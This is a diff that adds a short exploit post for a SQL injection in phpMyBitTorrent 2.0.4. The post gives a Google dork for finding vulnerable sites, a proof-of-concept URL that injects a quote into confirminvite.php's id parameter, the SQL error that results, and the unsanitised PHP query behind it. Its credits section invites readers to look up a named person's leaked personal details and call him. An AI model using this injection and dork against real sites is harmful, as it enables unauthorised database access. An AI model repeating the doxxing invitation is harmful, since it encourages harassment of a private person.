@@ -1,0 +1,45 @@
+# Exploit Title: phpMyBitTorrent 2.0.4 SQL injection
+# Google Dork: inurl:"user.php?op=register"
+# Date: 14/FEB/2011
+# Author: #forkbombers@irc.smashthestack.org
+# Software Link: http://sourceforge.net/projects/phpmybittorrent/
+# Version: 2.0.4
+# Tested on: *nix
+
+----------------------------------------------------------------------
+			[INFO]
+
+Sadly although the Google dork returns 36,000 results for this to work the invitation
+system needs to be enabled for this exploit to work. Fucking useless to me.
+
+----------------------------------------------------------------------
+			[XPL]
+
+localhost/torrents/confirminvite.php?id=1'
+
+Error Executing SQL Query SELECT password, active FROM torrent_users WHERE id =
+
+----------------------------------------------------------------------
+			[CODE]
+[code]
+$sql = "SELECT password, active FROM ".$db_prefix."_users WHERE id = $id";
+$res = $db->sql_query($sql) or btsqlerror($sql);
+$row = $db->sql_fetchrow($res);
+
+if (!$row)
+bterror(_bterrusernotexists,_btsorry);
+
+if ($row["active"] != '0') {
+OpenTable(_btsignup);
+echo "<p>"._btuseralreadyactive."</p>";
+CloseTable();
+include('footer.php')
+[/code]
+
+----------------------------------------------------------------------
+			[CREDS]
+
+Thanks to Gumbie@irc.efnet.org for letting me use his box to test :)
+Fuck ak for being such a bitch (not really <3 u), btw his d0x are g00gleiz3d if you want to give him a call
+
+----------------------------------------------------------------------
